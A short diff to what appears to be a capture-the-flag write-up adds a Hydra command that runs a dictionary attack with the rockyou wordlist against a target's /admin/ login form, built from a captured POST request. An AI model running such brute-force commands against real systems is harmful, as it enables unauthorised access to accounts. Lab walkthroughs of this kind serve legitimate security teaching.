@@ -52,3 +52,6 @@ Alright, now that we know the username, let's get a more indepth look at this lo
 ![post](https://github.com/user-attachments/assets/27a419f6-48f8-4ea0-9d93-f05499d65be4)
 
 This capruted post request will provide us with everything we need to craft a dictionary attack. Here's how our command should look:
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+```
